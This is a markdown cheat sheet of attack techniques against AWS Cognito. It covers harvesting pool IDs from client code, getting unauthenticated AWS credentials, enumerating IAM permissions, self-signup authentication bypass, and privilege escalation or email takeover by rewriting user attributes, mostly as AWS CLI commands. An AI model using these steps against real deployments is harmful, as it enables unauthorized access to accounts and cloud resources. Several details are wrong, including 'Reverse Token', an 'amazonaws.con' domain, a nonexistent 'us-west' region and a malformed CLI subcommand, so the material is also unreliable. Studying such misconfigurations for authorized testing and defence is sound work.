# AWS Cognito 
- It is used to add user sign-up and sign-in features and control access to web and mobile application
## AWS Components
- User Pool
Allows authentication -> Sign Up , Sign In
- Indentity Pools : Allows authenticated and unauthenticated users to access AWS resources using temporary AWS credentials.

## Cognito Authentication Flow
- User Authenticates By User pool
- User pool Returns 3 JWT Tokens
	1. ID Token 
	1. Access Token 
	1. Reverse Token
- The ID Token Is Passed To Identity Pool
- Identity Pool Generates Temp Credentials For The User According To Permission And Roles That User Owns.
- That Temp Credential is used again to access database, AWS infrastructure accoring to the credential

### Detect Cognito 
- UserPool
```bash
https://cognito-idp.us-west-2.amazonaws.com
https://cognito-idp.us-west.amazonaws.com
```
- Identity Pool
```bash
https://cognito-identity.us-west-2.amazonaws.con
```
## Security Misconfiguration 
#### Unauthorized access to AWS services due to Liberal AWS Credentials
-. Try To Fetch temporary AWS credential using unauthenticated user
-. To Generate AWS credentials find identity Pool id which is usually hardcoded in source code
1. Client ID
1. User Pool ID
1. Region
1. Identity Pool ID
- Use RedJS , Grep , Burp History To Look For keywords like
```bash
aws_cognito_identity_pool_id
identityPoolid
cognitoIdentityPoolId
userPoolWebClientId
userPoolId
aws_user_pools_id
```
- Test For Resource Access
1. Request to user pool for tokens
```bash
 aws cognito-identity get-id --identity-pool-id <identity-pool-id> --region <region>
```
1. Get Credentials from identity pool
```bash
 aws cognito-identity get-credentials-foridentity --identity-id <identity-id> --region <region>
```

1. Enumrate For Permissions
```bash
## enumrate-iam github
## ScoutSuite
./enumrate-iam.py --access-key <accesskey-id> --secret-key <secret-key> --session-token <sessionToken>
```

#### Authentication Bypass due to enabled signup API action
```bash
aws cognito-idp sign-up --client-id <client-id> --username <email> --password <password> --region <region>
```
- Email Verification
```bash
aws cognito-idp confirm-sign-up --client-id <client-id> --username <email> --confirm-code <verification code> --region <region>
```
### Privilege Escalation Due To Writable User Attributes
- Login and obtian Authorization token from header
- user aws client to check writeable attributes
```bash
aws cognito-idp get-user --region <region> --access-token <access-token>
```
- Update Writeable Attributes
```bash
aws cognito-idp update-user-attributes --access-token <acess-token> --region <region> --user-attributes Name="<attribute-name>",Value="<new-value>"
```
### Update email attribute before verification
```bash
aws cognito-idp update-user-attributes --access-token <token> --region <region> --user-attributes Name="email" Value="<new-email-address>"
```
